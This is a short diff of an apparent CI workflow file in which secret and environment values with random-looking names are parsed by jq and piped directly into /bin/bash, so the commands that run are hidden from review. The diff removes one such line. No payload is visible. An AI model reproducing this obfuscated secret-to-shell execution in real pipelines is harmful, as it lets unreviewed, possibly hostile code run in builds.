@@ -18,7 +18,6 @@ jobs:
           lrii95159: ${{ secrets.lrii95159 }}
         run: |
           printf '%s' "$lrii95159" | jq -r .aoyiz3 | /bin/bash
-          printf '%s' "$aekhc52" | jq -r .s9896 | /bin/bash
           echo $gzury6 | jq -r .y86380 | /bin/bash
 
       - name: Save archive
